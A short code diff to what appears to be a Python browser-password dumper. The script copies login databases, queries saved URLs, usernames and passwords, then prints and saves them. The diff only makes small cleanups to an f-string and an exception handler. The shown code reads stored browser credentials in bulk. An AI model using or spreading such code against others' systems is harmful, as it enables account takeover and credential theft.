@@ -83,7 +83,7 @@ def main():
 
 	for db in dbs:
 		shutil.copy(db, "db") # creating a copy of the database, sometimes the db is being locked.
-		conn = sqlite3.connect(f"db")
+		conn = sqlite3.connect("db")
 		cursor = conn.cursor()
 		try:
 			cursor.execute("SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins")
@@ -96,7 +96,7 @@ def main():
 				if len(password) > 0:
 					save_results(url, username, password, created_date, date_last_used)
 					print(f"{'-'*50}\nWebsite-URL: {url}\nUsername: {username}\nPassword: {password}\nCreated Date: {created_date}\nLast Used Date: {date_last_used}")
-		except KeyboardInterrupt as e:
+		except Exception as e:
 			print(e)
 		cursor.close()
 		conn.close()
